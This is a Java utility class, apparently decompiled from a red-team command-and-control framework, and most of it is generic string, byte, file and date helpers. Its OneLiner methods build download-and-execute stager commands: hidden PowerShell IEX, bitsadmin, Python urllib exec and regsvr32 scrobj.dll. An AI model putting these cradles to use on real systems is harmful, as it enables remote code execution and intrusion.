package common;

import dialog.DialogUtils;
import encoders.Base64;
import graph.Route;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.DataInputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.io.OutputStream;
import java.io.PrintStream;
import java.io.UnsupportedEncodingException;
import java.net.URLDecoder;
import java.net.URLEncoder;
import java.nio.ByteBuffer;
import java.nio.ByteOrder;
import java.nio.charset.Charset;
import java.security.DigestInputStream;
import java.security.MessageDigest;
import java.text.SimpleDateFormat;
import java.util.Arrays;
import java.util.Collection;
import java.util.Date;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Iterator;
import java.util.LinkedList;
import java.util.List;
import java.util.Map;
import java.util.Random;
import java.util.Set;
import java.util.Stack;
import java.util.TimeZone;
import java.util.UUID;
import java.util.zip.GZIPInputStream;
import java.util.zip.GZIPOutputStream;
import javax.swing.SwingUtilities;
import sleep.runtime.Scalar;
import sleep.runtime.ScalarArray;
import sleep.runtime.SleepUtils;

public class CommonUtils {
   private static final SimpleDateFormat A = new SimpleDateFormat("MM/dd HH:mm:ss");
   private static final SimpleDateFormat E = new SimpleDateFormat("MM/dd HH:mm");
   private static final SimpleDateFormat C = new SimpleDateFormat("MM/dd HH:mm:ss zzz");
   private static final Random D;
   private static final char[] B;

   public static final String scrub(String var0) {
      return var0 == null ? null : var0.replace('\u001b', '.');
   }

   public static final void print_error(String var0) {
      System.out.println("\u001b[01;31m[-]\u001b[0m " + scrub(var0));
   }

   public static final void print_error_file(String var0) {
      try {
         System.out.println("\u001b[01;31m[-]\u001b[0m " + bString(readResource(var0)));
      } catch (Exception var2) {
         MudgeSanity.logException("exception printing my error! " + var0, var2, false);
      }

   }

   public static final void print_good(String var0) {
      System.out.println("\u001b[01;32m[+]\u001b[0m " + scrub(var0));
   }

   public static final void print_opsec(String var0) {
      System.out.println("\u001b[00;33m[%]\u001b[0m " + scrub(var0));
   }

   public static final void print_info(String var0) {
      System.out.println("\u001b[01;34m[*]\u001b[0m " + scrub(var0));
   }

   public static final void print_warn(String var0) {
      System.out.println("\u001b[01;33m[!]\u001b[0m " + scrub(var0));
   }

   public static final void print_stat(String var0) {
      System.out.println("\u001b[01;35m[*]\u001b[0m " + scrub(var0));
   }

   public static final void describe(String var0) {
      print_info("[" + Thread.currentThread() + "] " + scrub(var0));
   }

   public static final void print_trial(String var0) {
      if (License.isTrial()) {
         System.out.println("\u001b[01;36m[$]\u001b[0m " + scrub(var0) + " \u001b[01;36m[This is a trial version limitation]\u001b[0m");
      }

   }

   public static final Object[] args(Object var0) {
      Object[] var1 = new Object[]{var0};
      return var1;
   }

   public static final Object[] args(Object var0, Object var1) {
      Object[] var2 = new Object[]{var0, var1};
      return var2;
   }

   public static final Object[] args(Object var0, Object var1, Object var2) {
      Object[] var3 = new Object[]{var0, var1, var2};
      return var3;
   }

   public static final Object[] args(Object var0, Object var1, Object var2, Object var3) {
      Object[] var4 = new Object[]{var0, var1, var2, var3};
      return var4;
   }

   public static final Object[] args(Object var0, Object var1, Object var2, Object var3, Object var4) {
      Object[] var5 = new Object[]{var0, var1, var2, var3, var4};
      return var5;
   }

   public static final Object[] args(Object var0, Object var1, Object var2, Object var3, Object var4, Object var5) {
      Object[] var6 = new Object[]{var0, var1, var2, var3, var4, var5};
      return var6;
   }

   public static final Object[] args(Object var0, Object var1, Object var2, Object var3, Object var4, Object var5, Object var6) {
      Object[] var7 = new Object[]{var0, var1, var2, var3, var4, var5, var6};
      return var7;
   }

   public static final Object[] args(Object var0, Object var1, Object var2, Object var3, Object var4, Object var5, Object var6, Object var7) {
      Object[] var8 = new Object[]{var0, var1, var2, var3, var4, var5, var6, var7};
      return var8;
   }

   public static final boolean isDate(String var0, String var1) {
      try {
         SimpleDateFormat var2 = new SimpleDateFormat(var1);
         var2.parse(var0).getTime();
         return true;
      } catch (Exception var3) {
         return false;
      }
   }

   public static final long days(int var0) {
      return 86400000L * (long)var0;
   }

   public static final long parseDate(String var0, String var1) {
      try {
         SimpleDateFormat var2 = new SimpleDateFormat(var1);
         return var2.parse(var0).getTime();
      } catch (Exception var3) {
         MudgeSanity.logException("Could not parse '" + var0 + "' with '" + var1 + "'", var3, false);
         return 0L;
      }
   }

   public static final String formatDateAny(String var0, long var1) {
      Date var3 = new Date(var1);
      SimpleDateFormat var4 = new SimpleDateFormat(var0);
      return var4.format(var3);
   }

   public static final String formatLogDate(long var0) {
      Date var2 = new Date(var0);
      return C.format(var2);
   }

   public static final String formatDate(long var0) {
      Date var2 = new Date(var0);
      return A.format(var2);
   }

   public static final String formatTime(long var0) {
      Date var2 = new Date(var0);
      return E.format(var2);
   }

   public static final String pad(String var0, int var1) {
      return pad(var0, ' ', var1);
   }

   public static final String pad(String var0, char var1, int var2) {
      StringBuffer var3 = new StringBuffer(var0);

      for(int var4 = var0.length(); var4 < var2; ++var4) {
         var3.append(var1);
      }

      return var3.toString();
   }

   public static final String padr(String var0, String var1, int var2) {
      StringBuffer var3 = new StringBuffer();

      for(int var4 = var0.length(); var4 < var2; ++var4) {
         var3.append(var1);
      }

      var3.append(var0);
      return var3.toString();
   }

   public static final String join(Collection var0, String var1) {
      StringBuffer var2 = new StringBuffer();
      Iterator var3 = var0.iterator();

      while(var3.hasNext()) {
         var2.append(var3.next() + "");
         if (var3.hasNext()) {
            var2.append(var1);
         }
      }

      return var2.toString();
   }

   public static final String joinObjects(Object[] var0, String var1) {
      StringBuffer var2 = new StringBuffer();

      for(int var3 = 0; var3 < var0.length; ++var3) {
         if (var0[var3] != null) {
            var2.append(var0[var3].toString());
            if (var3 + 1 < var0.length) {
               var2.append(var1);
            }
         }
      }

      return var2.toString();
   }

   public static final String join(String[] var0, String var1) {
      StringBuffer var2 = new StringBuffer();

      for(int var3 = 0; var3 < var0.length; ++var3) {
         var2.append(var0[var3]);
         if (var3 + 1 < var0.length) {
            var2.append(var1);
         }
      }

      return var2.toString();
   }

   public static void Guard() {
      if (!SwingUtilities.isEventDispatchThread()) {
         print_error("Violation of EDT Contract in: " + Thread.currentThread().getName());
         Thread.currentThread();
         Thread.dumpStack();
      }

   }

   public static final void sleep(long var0) {
      try {
         Thread.sleep(var0);
      } catch (InterruptedException var3) {
         MudgeSanity.logException("sleep utility", var3, false);
      }

   }

   public static void writeObject(File var0, Object var1) {
      try {
         ObjectOutputStream var2 = new ObjectOutputStream(new FileOutputStream(var0, false));
         var2.writeObject(SleepUtils.getScalar(var1));
         var2.close();
      } catch (Exception var3) {
         MudgeSanity.logException("writeObject: " + var0, var3, false);
      }

   }

   public static Object readObjectResource(String var0) {
      try {
         ObjectInputStream var1 = new ObjectInputStream(resource(var0));
         Object var2 = var1.readObject();
         var1.close();
         return var2;
      } catch (Exception var3) {
         MudgeSanity.logException("readObjectResource: " + var0, var3, false);
         return null;
      }
   }

   public static Object readObject(File var0, Object var1) {
      try {
         if (var0.exists()) {
            ObjectInputStream var2 = new ObjectInputStream(new FileInputStream(var0));
            Scalar var3 = (Scalar)var2.readObject();
            var2.close();
            return var3.objectValue();
         }
      } catch (Exception var4) {
         MudgeSanity.logException("readObject: " + var0, var4, false);
      }

      return var1;
   }

   public static final byte[] bswap(byte[] var0) {
      byte[] var1 = new byte[var0.length];

      for(int var2 = 0; var2 < var0.length; ++var2) {
         var1[var2] = var0[var0.length - (var2 + 1)];
      }

      return var1;
   }

   public static final byte[] toBytes(String var0) {
      int var1 = var0.length();
      byte[] var2 = new byte[var1];

      for(int var3 = 0; var3 < var1; ++var3) {
         var2[var3] = (byte)var0.charAt(var3);
      }

      return var2;
   }

   public static final String bString(byte[] var0) {
      try {
         return new String(var0, "ISO8859-1");
      } catch (UnsupportedEncodingException var2) {
         MudgeSanity.logException("bString", var2, false);
         return "";
      }
   }

   public static final String peekFile(File var0, int var1) {
      StringBuffer var2 = new StringBuffer(var1);

      try {
         FileInputStream var3 = new FileInputStream(var0);

         for(int var4 = 0; var4 < var1; ++var4) {
            int var5 = var3.read();
            if (var5 == -1) {
               break;
            }

            var2.append((char)var5);
         }

         var3.close();
         return var2.toString();
      } catch (IOException var6) {
         MudgeSanity.logException("peekFile: " + var0, var6, false);
         return var2.toString();
      }
   }

   public static final byte[] readFile(String var0) {
      try {
         FileInputStream var1 = new FileInputStream(var0);
         byte[] var2 = readAll(var1);
         var1.close();
         return var2;
      } catch (IOException var3) {
         MudgeSanity.logException("readFile: " + var0, var3, false);
         return new byte[0];
      }
   }

   public static final byte[] readAndSumFi1e(String var0) {
      try {
         MessageDigest var1 = MessageDigest.getInstance("MD5");
         long var2 = (new File(var0)).length();
         DigestInputStream var4 = new DigestInputStream(new FileInputStream(var0), var1);
         byte[] var5 = new byte['耀'];

         while(var4.read(var5) >= var5.length) {
         }

         var4.close();
         return var1.digest();
      } catch (Throwable var6) {
         return new byte[0];
      }
   }

   public static final byte[] readAll(InputStream var0) {
      try {
         ByteArrayOutputStream var1 = new ByteArrayOutputStream(var0.available());

         while(true) {
            int var2 = var0.read();
            if (var2 == -1) {
               byte[] var4 = var1.toByteArray();
               var1.close();
               return var4;
            }

            var1.write(var2);
         }
      } catch (Exception var3) {
         MudgeSanity.logException("readAll", var3, false);
         return new byte[0];
      }
   }

   public static String[] toArray(String var0) {
      return var0.split(",\\s*");
   }

   public static String[] toArray(Collection var0) {
      String[] var1 = new String[var0.size()];
      Iterator var2 = var0.iterator();

      for(int var3 = 0; var2.hasNext(); ++var3) {
         var1[var3] = var2.next() + "";
      }

      return var1;
   }

   public static String[] toArray(Object[] var0) {
      String[] var1 = new String[var0.length];

      for(int var2 = 0; var2 < var0.length; ++var2) {
         var1[var2] = var0[var2] + "";
      }

      return var1;
   }

   public static List toList(String var0) {
      String[] var1 = toArray(var0);
      return new LinkedList(Arrays.asList(var1));
   }

   public static Set toSet(String var0) {
      return "".equals(var0) ? new HashSet() : new HashSet(toList(var0));
   }

   public static Set toSet(Object[] var0) {
      return new HashSet(toList(var0));
   }

   public static Set toSetLC(String[] var0) {
      HashSet var1 = new HashSet();

      for(int var2 = 0; var2 < var0.length; ++var2) {
         if (var0[var2] != null) {
            var1.add(var0[var2].toLowerCase());
         }
      }

      return var1;
   }

   public static List toList(Object[] var0) {
      LinkedList var1 = new LinkedList();

      for(int var2 = 0; var2 < var0.length; ++var2) {
         var1.add(var0[var2]);
      }

      return var1;
   }

   public static Scalar toSleepArray(Object[] var0) {
      return SleepUtils.getArrayWrapper(toList(var0));
   }

   public static String[] toStringArray(ScalarArray var0) {
      int var1 = 0;
      String[] var2 = new String[var0.size()];

      for(Iterator var3 = var0.scalarIterator(); var3.hasNext(); ++var1) {
         var2[var1] = var3.next() + "";
      }

      return var2;
   }

   public static Stack scalar(String var0) {
      Stack var1 = new Stack();
      var1.push(SleepUtils.getScalar(var0));
      return var1;
   }

   public static Stack scalar(String var0, String var1) {
      Stack var2 = new Stack();
      var2.push(SleepUtils.getScalar(var1));
      var2.push(SleepUtils.getScalar(var0));
      return var2;
   }

   public static int rand(int var0) {
      return D.nextInt(var0);
   }

   public static String pick(String[] var0) {
      return var0[rand(var0.length)];
   }

   public static Object pick(List var0) {
      Object[] var1 = var0.toArray();
      return var1[rand(var1.length)];
   }

   public static String pick(String var0) {
      return pick(toArray(var0));
   }

   public static String toHex(long var0) {
      return Long.toHexString(var0).toLowerCase();
   }

   public static InputStream resource(String var0) throws IOException {
      return (InputStream)((new File(var0)).exists() ? new FileInputStream(new File(var0)) : CommonUtils.class.getClassLoader().getResourceAsStream(var0));
   }

   public static String readResourceAsString(String var0) {
      return bString(readResource(var0));
   }

   public static byte[] readResource(String var0) {
      try {
         InputStream var1 = resource(var0);
         if (var1 != null) {
            byte[] var2 = readAll(var1);
            var1.close();
            return var2;
         }

         print_error("Could not find resource: " + var0);
      } catch (IOException var3) {
         MudgeSanity.logException("readResource: " + var0, var3, false);
      }

      return new byte[0];
   }

   public static String replaceAt(String var0, String var1, int var2) {
      StringBuffer var3 = new StringBuffer(var0);
      var3.delete(var2, var2 + var1.length());
      var3.insert(var2, var1);
      return var3.toString();
   }

   public static int indexOf(byte[] var0, byte[] var1, int var2, int var3) {
      boolean var4 = false;

      for(int var5 = var2; var5 < var0.length && var5 < var3; ++var5) {
         var4 = true;

         for(int var6 = 0; var6 < var1.length && var6 < var0.length; ++var6) {
            if (var0[var5 + var6] != var1[var6]) {
               var4 = false;
               break;
            }
         }

         if (var4) {
            return var5;
         }
      }

      return -1;
   }

   public static byte[] patch(byte[] var0, byte[] var1, byte[] var2) {
      int var3 = indexOf(var0, var1, 0, var0.length);
      if (!AssertUtils.Test(var3 >= 0, "patch: findme " + toHex(var1) + " is not in data (" + var0.length + " bytes)")) {
         return var0;
      } else {
         System.arraycopy(var2, 0, var0, var3, var2.length);
         return var0;
      }
   }

   public static byte[] patch(byte[] var0, byte[] var1, byte[] var2, int var3) {
      AssertUtils.Test(var3 >= var2.length, "patch " + toHex(var1) + " with " + toHex(var2) + " has [final value] that exceeds " + var3);
      AssertUtils.Test(var3 >= var1.length, "patch " + toHex(var1) + " with " + toHex(var2) + " has [patch stub] that exceeds " + var3);
      return patch(var0, var1, pad(var2, var3));
   }

   public static byte[] patch(byte[] var0, String var1, String var2, int var3) {
      return patch(var0, toBytes(var1), toBytes(var2), var3);
   }

   public static byte[] patch(byte[] var0, String var1, byte[] var2, int var3) {
      return patch(var0, toBytes(var1), var2, var3);
   }

   public static void memcpy(byte[] var0, byte[] var1, int var2) {
      System.arraycopy(var1, 0, var0, 0, var2);
   }

   public static byte[] patch(byte[] var0, String var1, String var2) {
      return patch(var0, toBytes(var1), toBytes(var2));
   }

   public static byte[] _patch(byte[] var0, String var1, String var2) {
      String var3 = bString(var0);
      StringBuffer var4 = new StringBuffer(var3);
      int var5 = var3.indexOf(var1);
      AssertUtils.Test(var5 >= 0, "patch() old value '" + var1 + "' not found");
      var4.delete(var5, var5 + var2.length());
      var4.insert(var5, var2);
      return toBytes(var4.toString());
   }

   public static String writeToTemp(String var0, String var1, byte[] var2) {
      try {
         File var3 = File.createTempFile(var0, var1);
         String var4 = writeToFile(var3, var2);
         var3.deleteOnExit();
         return var4;
      } catch (IOException var5) {
         MudgeSanity.logException("writeToTemp", var5, false);
         return null;
      }
   }

   public static String writeToFile(File var0, byte[] var1) {
      try {
         FileOutputStream var2 = new FileOutputStream(var0, false);
         var2.write(var1, 0, var1.length);
         var2.flush();
         var2.close();
         return var0.getAbsolutePath();
      } catch (IOException var3) {
         MudgeSanity.logException("writeToFile", var3, false);
         return null;
      }
   }

   public static String repeat(String var0, int var1) {
      StringBuffer var2 = new StringBuffer(var0.length() * var1);

      for(int var3 = 0; var3 < var1; ++var3) {
         var2.append(var0);
      }

      return var2.toString();
   }

   public static byte[] zeroOut(byte[] var0, String[] var1) {
      String var2 = bString(var0);
      StringBuffer var3 = new StringBuffer(var2);

      for(int var4 = 0; var4 < var1.length; ++var4) {
         int var5 = var2.indexOf(var1[var4]);
         int var6 = var1[var4].length();
         if (var5 > -1) {
            var3.delete(var5, var5 + var6);
            var3.insert(var5, new char[var6]);
         }
      }

      return toBytes(var3.toString());
   }

   public static byte[] strrep(byte[] var0, String var1, String var2) {
      return toBytes(strrep(bString(var0), var1, var2));
   }

   public static String strrep(String var0, String var1, String var2) {
      StringBuffer var3 = new StringBuffer(var0);
      if (var1.length() == 0) {
         return var0;
      } else {
         int var4 = 0;
         int var5 = var1.length();

         for(int var6 = var2.length(); (var4 = var3.indexOf(var1, var4)) > -1; var4 += var2.length()) {
            var3.replace(var4, var4 + var5, var2);
         }

         return var3.toString();
      }
   }

   public static void copyFile(String var0, File var1) {
      try {
         FileInputStream var2 = new FileInputStream(var0);
         byte[] var3 = readAll(var2);
         var2.close();
         writeToFile(var1, var3);
      } catch (IOException var4) {
         MudgeSanity.logException("copyFile: " + var0 + " -> " + var1, var4, false);
      }

   }

   public static double toDoubleNumber(String var0, double var1) {
      try {
         return Double.parseDouble(var0);
      } catch (Exception var4) {
         return var1;
      }
   }

   public static int toNumber(String var0, int var1) {
      try {
         return Integer.parseInt(var0);
      } catch (Exception var3) {
         return var1;
      }
   }

   public static int toNumberFromHex(String var0, int var1) {
      try {
         return Integer.parseInt(var0, 16);
      } catch (Exception var3) {
         return var1;
      }
   }

   public static long toLongNumber(String var0, long var1) {
      try {
         return Long.parseLong(var0);
      } catch (Exception var4) {
         return var1;
      }
   }

   public static boolean isHexNumber(String var0) {
      try {
         Integer.parseInt(var0, 16);
         return true;
      } catch (Exception var2) {
         return false;
      }
   }

   public static boolean isNumber(String var0) {
      try {
         Integer.parseInt(var0);
         return true;
      } catch (Exception var2) {
         return false;
      }
   }

   public static boolean isNullOrEmpty(String var0) {
      return var0 == null || var0.isEmpty() || var0.trim().isEmpty();
   }

   public static int toTripleOffset(String var0) {
      char var1 = var0.charAt(0);
      char var2 = var0.charAt(1);
      char var3 = var0.charAt(2);
      int var4 = 0;
      var4 += var1 - 97;
      var4 += (var2 - 97) * 26;
      var4 += (var3 - 97) * 26 * 26;
      return var4;
   }

   public static String[] expand(String var0) {
      String[] var1 = new String[var0.length()];

      for(int var2 = 0; var2 < var1.length; ++var2) {
         var1[var2] = var0.charAt(var2) + "";
      }

      return var1;
   }

   public static String toHex(byte[] var0) {
      StringBuffer var1 = new StringBuffer();

      for(int var2 = 0; var2 < var0.length; ++var2) {
         int var3 = var0[var2] & 15;
         int var4 = var0[var2] >> 4 & 15;
         var1.append(Integer.toString(var4, 16));
         var1.append(Integer.toString(var3, 16));
      }

      return var1.toString().toLowerCase();
   }

   public static String toHexString(byte[] var0) {
      StringBuffer var1 = new StringBuffer();
      var1.append("[");

      for(int var2 = 0; var2 < var0.length; ++var2) {
         var1.append(Integer.toString(var0[var2] & 255, 16));
         if (var2 < var0.length - 1) {
            var1.append(",");
         }
      }

      var1.append("]");
      return var1.toString();
   }

   public static void dumpBytesAsHex(byte[] var0, int var1, int var2) {
      char[] var3 = new char[(var2 - var1 + 1) * 2];
      int var4 = var1;

      int var5;
      int var6;
      for(var5 = 0; var4 < var2; ++var5) {
         var6 = var0[var4] & 255;
         var3[var5 * 2] = B[var6 >>> 4];
         var3[var5 * 2 + 1] = B[var6 & 15];
         ++var4;
      }

      var4 = 0;
      System.out.print(String.format("%05d: ", var4));
      var5 = 0;

      for(var6 = 0; var5 < var3.length; ++var6) {
         System.out.print(var3[var5]);
         System.out.print(var3[var5 + 1]);
         System.out.print(' ');
         if (var6 == 7) {
            System.out.print(' ');
         }

         if (var6 == 15) {
            System.out.println("");
            PrintStream var10000 = System.out;
            Object[] var10002 = new Object[1];
            ++var4;
            var10002[0] = var4 * 16;
            var10000.print(String.format("%05d: ", var10002));
            var6 = -1;
         }

         var5 += 2;
      }

      System.out.println("");
   }

   public static String toAggressorScriptHexString(byte[] var0) {
      StringBuffer var1 = new StringBuffer();

      for(int var2 = 0; var2 < var0.length; ++var2) {
         String var3 = Integer.toString(var0[var2] & 255, 16);
         if (var3.length() == 1) {
            var1.append("\\x0");
         } else {
            var1.append("\\x");
         }

         var1.append(var3);
      }

      return var1.toString();
   }

   public static String hex(int var0) {
      String var1 = Integer.toString(var0 & 255, 16);
      return var1.length() == 1 ? "0" + var1 : var1;
   }

   public static String toUnicodeEscape(byte var0) {
      String var1 = hex(var0);
      return "00" + var1;
   }

   public static String toNasmHexString(byte[] var0) {
      StringBuffer var1 = new StringBuffer();
      var1.append("db ");

      for(int var2 = 0; var2 < var0.length; ++var2) {
         var1.append("0x");
         var1.append(Integer.toString(var0[var2] & 255, 16));
         if (var2 < var0.length - 1) {
            var1.append(",");
         }
      }

      return var1.toString();
   }

   public static byte[] pad(byte[] var0, int var1) {
      return var0.length < var1 ? Arrays.copyOf(var0, var1) : var0;
   }

   public static byte[] padg(byte[] var0, int var1) {
      return var0.length >= var1 ? var0 : join(var0, randomData(var1 - var0.length));
   }

   public static byte[] pad(byte[] var0) {
      int var1;
      for(var1 = 0; (var0.length + var1) % 4 != 0; ++var1) {
      }

      return Arrays.copyOf(var0, var0.length + var1);
   }

   public static String PowerShellOneLiner(String var0) {
      String var1 = PowerShellIEXOneLiner(var0);
      return "powershell.exe -nop -w hidden -c \"" + var1 + "\"";
   }

   public static String PowerShellIEXOneLiner(String var0) {
      return "IEX ((new-object net.webclient).downloadstring('" + var0 + "'))";
   }

   public static String EncodePowerShellOneLiner(String var0) {
      try {
         return "powershell.exe -nop -w hidden -encodedcommand " + Base64.encode(var0.getBytes("UTF-16LE"));
      } catch (Exception var2) {
         MudgeSanity.logException("Could not encode: '" + var0 + "'", var2, false);
         return "";
      }
   }

   public static String OneLiner(String var0, String var1) {
      if ("bitsadmin".equals(var1)) {
         String var2 = garbage("temp");
         return "cmd.exe /c bitsadmin /transfer " + var2 + " " + var0 + " %APPDATA%\\" + var2 + ".exe&%APPDATA%\\" + var2 + ".exe&del %APPDATA%\\" + var2 + ".exe";
      } else if ("exe".equals(var1)) {
         return var0;
      } else if ("powershell".equals(var1)) {
         return PowerShellOneLiner(var0);
      } else if ("powershell IEX".equals(var1)) {
         return PowerShellIEXOneLiner(var0);
      } else if ("python".equals(var1)) {
         return "python -c \"import urllib2; exec urllib2.urlopen('" + var0 + "').read();\"";
      } else if ("regsvr32".equals(var1)) {
         return "regsvr32 /s /n /u /i:" + var0 + " scrobj.dll";
      } else {
         print_error("'" + var1 + "' for URL '" + var0 + "' does not have a one-liner");
         throw new RuntimeException("'" + var1 + "' for URL '" + var0 + "' does not have a one-liner");
      }
   }

   public static List combine(List var0, List var1) {
      LinkedList var2 = new LinkedList();
      var2.addAll(var0);
      var2.addAll(var1);
      return var2;
   }

   public static byte[] join(byte[] var0, byte[] var1) {
      byte[] var2 = new byte[var0.length + var1.length];
      System.arraycopy(var0, 0, var2, 0, var0.length);
      System.arraycopy(var1, 0, var2, var0.length, var1.length);
      return var2;
   }

   public static byte[] join(byte[] var0, byte[] var1, byte[] var2) {
      byte[] var3 = new byte[var0.length + var1.length + var2.length];
      System.arraycopy(var0, 0, var3, 0, var0.length);
      System.arraycopy(var1, 0, var3, var0.length, var1.length);
      System.arraycopy(var2, 0, var3, var0.length + var1.length, var2.length);
      return var3;
   }

   public static List readOptions(String var0) {
      LinkedList var1 = new LinkedList();

      try {
         byte[] var2 = readResource(var0);
         DataInputStream var3 = new DataInputStream(new ByteArrayInputStream(var2));

         while(var3.available() > 0) {
            int var4 = var3.readInt();
            if (var4 > var3.available()) {
               print_error("readOptions: " + var0 + " has bad length: " + var4 + " > " + var3.available());
               return var1;
            }

            byte[] var5 = new byte[var4];
            var3.read(var5);
            var1.add(var5);
         }
      } catch (IOException var6) {
         MudgeSanity.logException("readOptions: " + var0, var6, false);
      }

      return var1;
   }

   public static byte[] pickOption(String var0) {
      List var1 = readOptions(var0);
      byte[] var2 = (byte[])((byte[])var1.get(rand(var1.size())));
      return var2;
   }

   public static boolean isin(byte[] var0, byte[] var1) {
      return isin(bString(var0), bString(var1));
   }

   public static boolean isin(String var0, byte[] var1) {
      return isin(var0, bString(var1));
   }

   public static boolean isin(String var0, String var1) {
      return var1.indexOf(var0) >= 0;
   }

   public static Map toMap(String var0, String var1) {
      return toMap((Object[])(new String[]{var0}), (Object[])(new String[]{var1}));
   }

   public static Map toMap(String var0, String var1, String var2, String var3) {
      return toMap((Object[])(new String[]{var0, var2}), (Object[])(new String[]{var1, var3}));
   }

   public static Map toMap(String var0, String var1, String var2, String var3, String var4, String var5) {
      return toMap((Object[])(new String[]{var0, var2, var4}), (Object[])(new String[]{var1, var3, var5}));
   }

   public static Map toMap(String var0, String var1, String var2, String var3, String var4, String var5, String var6, String var7) {
      return toMap((Object[])(new String[]{var0, var2, var4, var6}), (Object[])(new String[]{var1, var3, var5, var7}));
   }

   public static Map toMap(Object[] var0, Object[] var1) {
      HashMap var2 = new HashMap();

      for(int var3 = 0; var3 < var0.length; ++var3) {
         var2.put(var0[var3], var1[var3]);
      }

      return var2;
   }

   public static byte[] asBinary(String var0) {
      try {
         File[] var1 = (new File(".")).listFiles();

         for(int var2 = 0; var2 < var1.length; ++var2) {
            if (checksum8(var1[var2].getName()) == 152L && var1[var2].getName().length() == 16) {
               return MD5(readFile(var1[var2].getAbsolutePath()));
            }
         }
      } catch (Throwable var3) {
      }

      return new byte[16];
   }

   public static String replaceHashes(String var0, String var1) {
      StringBuffer var2 = new StringBuffer();
      char[] var3 = var0.toCharArray();

      for(int var4 = 0; var4 < var3.length; ++var4) {
         if (var3[var4] == '#') {
            var2.append(var1.charAt(var4));
         } else {
            var2.append(var3[var4]);
         }
      }

      return var2.toString();
   }

   public static String replaceHashes(String var0) {
      return replaceHashes(var0, garbage(var0));
   }

   public static String garbage(String var0) {
      String var1 = strrep(ID(), "-", "");
      if (var0 == null) {
         return "";
      } else if (var0.length() > var1.length()) {
         return var1 + garbage(var0.substring(var1.length()));
      } else {
         return var0.length() == var1.length() ? var1 : var1.substring(0, var0.length());
      }
   }

   public static String ID() {
      return UUID.randomUUID().toString();
   }

   public static byte[] randomData(int var0) {
      byte[] var1 = new byte[var0];
      D.nextBytes(var1);
      return var1;
   }

   public static byte[] randomDataNoZeros(int var0) {
      boolean var1;
      byte[] var2;
      do {
         var2 = randomData(var0);
         var1 = true;

         for(int var3 = 0; var3 < var2.length; ++var3) {
            if (var2[var3] == 0) {
               var1 = false;
            }
         }
      } while(!var1);

      return var2;
   }

   public static byte[] MD5(byte[] var0) {
      try {
         MessageDigest var1 = MessageDigest.getInstance("MD5");
         var1.update(var0);
         return var1.digest();
      } catch (Exception var2) {
         MudgeSanity.logException("MD5", var2, false);
         return new byte[0];
      }
   }

   public static Map KV(String var0, String var1) {
      HashMap var2 = new HashMap();
      var2.put(var0, var1);
      return var2;
   }

   public static int randomPortAbove1024() {
      return rand(60000) + 2048;
   }

   public static int randomPort() {
      return rand(65535);
   }

   public static boolean is64bit() {
      return isin("64", System.getProperty("os.arch") + "");
   }

   public static String dropFile(String var0, String var1, String var2) {
      byte[] var3 = readResource(var0);
      return writeToTemp(var1, var2, var3);
   }

   public static void runSafe(final Runnable var0) {
      final Thread var1 = Thread.currentThread();
      if (SwingUtilities.isEventDispatchThread()) {
         try {
            var0.run();
         } catch (Exception var3) {
            MudgeSanity.logException("runSafe failed: " + var0 + " thread: " + var1, var3, false);
         }
      } else {
         SwingUtilities.invokeLater(new Runnable() {
            public void run() {
               try {
                  var0.run();
               } catch (Exception var2) {
                  MudgeSanity.logException("runSafe failed: " + var0 + " thread: " + var1, var2, false);
               }

            }
         });
      }

   }

   public static Scalar convertAll(Object var0) {
      return ScriptUtils.convertAll(var0);
   }

   public static Set difference(Set var0, Set var1) {
      HashSet var2 = new HashSet();
      var2.addAll(var0);
      var2.removeAll(var1);
      return var2;
   }

   public static Set intersection(Set var0, Set var1) {
      HashSet var2 = new HashSet();
      var2.addAll(var0);
      var2.retainAll(var1);
      return var2;
   }

   public static long dataIdentity(Object var0) {
      long var1 = 0L;
      if (var0 == null) {
         return 1L;
      } else {
         Iterator var3;
         if (var0 instanceof Collection) {
            for(var3 = ((Collection)var0).iterator(); var3.hasNext(); var1 += 11L * dataIdentity(var3.next())) {
            }
         } else {
            if (!(var0 instanceof Map)) {
               if (var0 instanceof BeaconEntry) {
                  Map var4 = ((BeaconEntry)var0).toMap();
                  var4.remove("last");
                  var4.remove("lastf");
                  return dataIdentity(var4);
               }

               if (var0 instanceof Number) {
                  return (long)var0.hashCode();
               }

               return (long)var0.toString().hashCode();
            }

            for(var3 = ((Map)var0).values().iterator(); var3.hasNext(); var1 += 13L * dataIdentity(var3.next())) {
            }
         }

         return var1;
      }
   }

   public static String trim(String var0) {
      return var0 == null ? null : var0.trim();
   }

   public static LinkedList parseTabData(String var0, String[] var1) {
      LinkedList var2 = new LinkedList();
      String[] var3 = var0.trim().split("\n");

      for(int var4 = 0; var4 < var3.length; ++var4) {
         HashMap var5 = new HashMap();
         String[] var6 = var3[var4].split("\t");

         for(int var7 = 0; var7 < var1.length && var7 < var6.length; ++var7) {
            var5.put(var1[var7], var6[var7]);
         }

         if (var5.size() > 0) {
            var2.add(var5);
         }
      }

      return var2;
   }

   public static boolean iswm(String var0, String var1) {
      try {
         if ((var0.length() == 0 || var1.length() == 0) && var0.length() != var1.length()) {
            return false;
         } else {
            int var2 = 0;

            int var3;
            for(var3 = 0; var2 < var0.length(); ++var3) {
               if (var0.charAt(var2) == '*') {
                  boolean var5 = var2 + 1 < var0.length() && var0.charAt(var2 + 1) == '*';

                  while(var0.charAt(var2) == '*') {
                     ++var2;
                     if (var2 == var0.length()) {
                        return true;
                     }
                  }

                  int var4;
                  for(var4 = var2; var4 < var0.length() && var0.charAt(var4) != '?' && var0.charAt(var4) != '\\' && var0.charAt(var4) != '*'; ++var4) {
                  }

                  if (var4 != var2) {
                     if (var5) {
                        var4 = var1.lastIndexOf(var0.substring(var2, var4));
                     } else {
                        var4 = var1.indexOf(var0.substring(var2, var4), var3);
                     }

                     if (var4 == -1 || var4 < var3) {
                        return false;
                     }

                     var3 = var4;
                  }

                  if (var0.charAt(var2) == '?') {
                     --var2;
                  }
               } else {
                  if (var3 >= var1.length()) {
                     return false;
                  }

                  if (var0.charAt(var2) == '\\') {
                     ++var2;
                     if (var2 < var0.length() && var0.charAt(var2) != var1.charAt(var3)) {
                        return false;
                     }
                  } else if (var0.charAt(var2) != '?' && var0.charAt(var2) != var1.charAt(var3)) {
                     return false;
                  }
               }

               ++var2;
            }

            return var3 == var1.length();
         }
      } catch (Exception var6) {
         MudgeSanity.logException(var0 + " iswm " + var1, var6, false);
         return false;
      }
   }

